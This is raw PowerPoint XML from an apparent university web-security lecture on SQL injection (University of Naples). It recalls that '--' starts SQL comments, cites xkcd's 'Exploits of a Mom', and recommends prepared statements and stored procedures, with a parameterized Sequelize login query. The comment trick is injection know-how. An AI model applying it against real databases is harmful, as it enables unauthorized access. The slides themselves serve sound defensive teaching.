                    <a:pt x="7766" y="104217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29394" y="62380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62380" y="29394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104217" y="7766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152400" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3000755" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3048938" y="7766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3090775" y="29394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3123761" y="62380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3145389" y="104217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3153155" y="152399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3153155" y="761999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3145389" y="810168"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3123761" y="852003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3090775" y="884994"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3048938" y="906630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3000755" y="914399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152400" y="914399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104217" y="906630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62380" y="884994"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29394" y="852003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7766" y="810168"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="761999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="152399"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="5A000E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1" name="object 11" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6876415" y="5418835"/>
            <a:ext cx="2692400" cy="574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 indent="150495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solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Remember</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-4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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-5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800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>«-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>-»</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-5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800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>start </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>single</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-2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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>line </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>comments</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-4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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-1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800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>SQL!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2" name="object 12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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="object 13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dirty="0" spc="-25"/>
              <a:t>32</a:t>
            </a:fld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10"/>
              <a:t>OBLIGATORY</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-105"/>
              <a:t>EXPLOITS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="70"/>
              <a:t>OF</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="120"/>
              <a:t>A</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="150"/>
              <a:t>MOM</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>BY</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>XKCD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9308972" y="5470347"/>
            <a:ext cx="2048510" cy="3003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u="sng" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://xkcd.com/327</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="object 4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57427" y="1973579"/>
            <a:ext cx="10747883" cy="3311652"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6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dirty="0" spc="-25"/>
              <a:t>32</a:t>
            </a:fld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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6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dirty="0" spc="-25"/>
              <a:t>32</a:t>
            </a:fld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30"/>
              <a:t>PREVENTING</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-90"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-85"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t>INJECTIONS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962050" y="1446872"/>
            <a:ext cx="7769859" cy="1050925"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="98425" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="775"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Use</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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prepared</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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statements</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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with</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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parametrized</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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queries</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="675"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Use</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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stored</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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procedures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882396" y="3137916"/>
            <a:ext cx="10427335" cy="2862580"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="111F35"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="33019" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342265" marR="7319009" indent="-250190">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="259"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>models.sequelize.query(</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>` </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>SELECT</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>*</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>FROM</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Users</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342265">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>WHERE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-40">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>email</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>$1</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>AND</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>password</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>$2</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>AND</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-5">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>deletedAt</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>IS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-15">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>NULL`</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="591820" marR="2429510" indent="-250190">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50"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bind:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50"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[</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35"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req.body.email,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50"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security.hash(req.body.password)</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-40">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>], </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>model:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-40"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models.User,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25"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plain:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30"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00FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>true</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20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dirty="0" sz="1800" spc="-25">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>})</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>.then((authenticatedUser:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35"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{</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35"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data:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35"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User</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35"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})</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20"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00FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20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dirty="0" sz="1800" spc="-50">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342265">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>/*</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30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8000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>user</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-35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8000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>found,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25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8000"/>
                </a:solidFill>
